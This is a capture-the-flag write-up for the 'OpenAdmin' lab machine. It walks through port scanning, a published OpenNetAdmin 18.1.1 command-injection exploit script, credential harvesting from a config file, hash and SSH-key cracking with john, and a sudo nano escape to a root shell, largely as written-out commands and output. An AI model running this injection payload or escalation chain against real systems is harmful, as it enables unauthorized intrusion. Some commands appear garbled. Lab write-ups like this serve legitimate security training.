# OpenAdmin

### [1] Reconnaissance & Enumeration

##### [1.1] Open Ports

First things first, an NMAP scan shows the following (partial) output:

```
nmap -p--Pn--min-rate=10000-sV-sC10.10.10.171
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
```

An more detailed scan can show us a little more with:

```
nmap -p- -Pn --min-rate=10000 -sV-sC 10.10.10.171
```

```
PORT   STATE SERVICE  VERSION
22/tcp open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  ssl/http Apache/2.4.29 (Ubuntu)
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We discover the usual OpenSSH and Apache servers on their respective default ports.

##### [1.2] Web discovery

The landing page is the default Apache2 page. A gobuster file/directory scan discovers 3 different websites:

```
$ gobuster dir -u http://10.10.10.171/ -w /usr/share/wordlists/dirb/common.txt 
/artwork
/music
/sierra
```

Artwork and Sierra propose different services for start-ups. The content is, for the most part, static, except for a contact form. Music, proposes music downloads for artists and is the only with a login page. However, the login page does not seem properly configured as it gives access to /ona, an instance of OpenNetAdmin v18.1.1 (see the page title), a tool to manage IP inventories. 

There is a public vulnerability impacting this tool and the version that is running:

```
$ searchsploit opennetadmin
------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                           |  Path
                                                                         | (/usr/share/exploitdb/)
------------------------------------------------------------------------- ----------------------------------------
OpenNetAdmin 13.03.01 - Remote Code Execution                            | exploits/php/webapps/26682.txt
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)             | exploits/php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution                              | exploits/php/webapps/47691.sh
------------------------------------------------------------------------- ----------------------------------------
```

### [2] Gaining Access

The content of the exploit 47691.sh is short:

```
URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```

This will output a pseudo-shell where we can send commands and get the results. Just for this case, lets edit the command to:

```
$ while true;do echo -n "$ "; read cmd;curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" http://10.10.10.171/ona/ | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1;done
```

By exploring the website files, we find some credentials in the database configuration file:

```
$ cat local/config/database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```

We can see that there are 2 users on the system: `joanna` and `jimmy`. We can see this with:

```
$ cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
$ /usr/bin/python3-c'import pty;pty.spawn("/bin/bash")
```

That password is `jimmy`'s and we get *SSH* acess.

### [3] Local Reconnaissance & Enumeration

Looking at the `/etc/apache2/sites-enabled/internal.conf` configuration file reveals that theinternal virtual host is running as joanna on localhost port `52846`

```
$ cat /etc/apache2/sites-enabled/internal.conf
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>

```

Inspection of `index.php` shows a login page, hard-coded with a hashed password.

```
jimmy@openadmin:/var/www/internal$ cat index.php

(...)
          <?php
            $msg = '';

            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
                  $_SESSION['username'] = 'jimmy';
                  header("Location: /main.php");
              } else {
                  $msg = 'Wrong username or password.';
              }
            }
         ?>
(...)
```

We can see that this was hashed using the SHA512 algorithm, which can be cracked using `John the Ripper`

```
john hash --format=Raw-SHA512 --wordlist=/usr/share/worlists/rockyou.txt --rules=Jumbo
```

Alternately, the [CrackStation](https://crackstation.net/) website can also be used to crack the hash.

### [4] Privilege Escalation

##### [4.1] User pivoting

We can crack the SHA512 hash online, and retrieve the private-key:

```
$ curl -XPOST localhost:52846 -d "login&username=jimmy&password=Revealed" -L -v
```

The redirection to `/main.php` does not seem to work though, but we get the session cookie that we can use:

```
$ curl localhost:52846/main.php -H "PHPSESSID=po0mav9u27apgapafu0r518aj2" -v
```

We grab the encrypted private-key of `joanna`. There is one last message at the bottom of the page:

```
Don't forget your "ninja" password
```

We save the key and prepare it for cracking with ssh2john.py:

```
$ ssh2john.py joanna_key > hash.txt
```

Then we crack it with `john`:


```
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

The password is: `bloodninjas`. We log in through SSH and get the user flag:

```
$ ssh -i joanna_key joanna@10.10.10.171
joanna@openadmin:~$ cat user.txt
c9b2****************************
```

##### [4.2] Root escalation

`joanna` is a `sudoer` and can run nano as root:

```
$ sudo -l

(...)
User joanna may run the following commands on openadmin
(ALL) NOPASSWS: /bin/nano /opt/priv
```

Running the following command I could get the key:

```
sudo /bin/nano /opt/priv
```

And [GTFObins](https://gtfobins.github.io/gtfobins/nano/#sudo) has the solution to spawn a shell as root:


```
sudo /bin/nano /opt/priv
Crtl-R Crtl-X
reset; sh 1>&0 2>&0
```

### [5] Conclusion

This machine requires basic enumeration, password/key cracking, usage of public exploits and knowledge of basic privilege escalation techniques.

##### [5.1] Resources

```
https://opennetadmin.com/[2] CrackStation
https://crackstation.net/[3] GTFObins - Nano 
https://gtfobins.github.io/gtfobins/nano/#sudo
```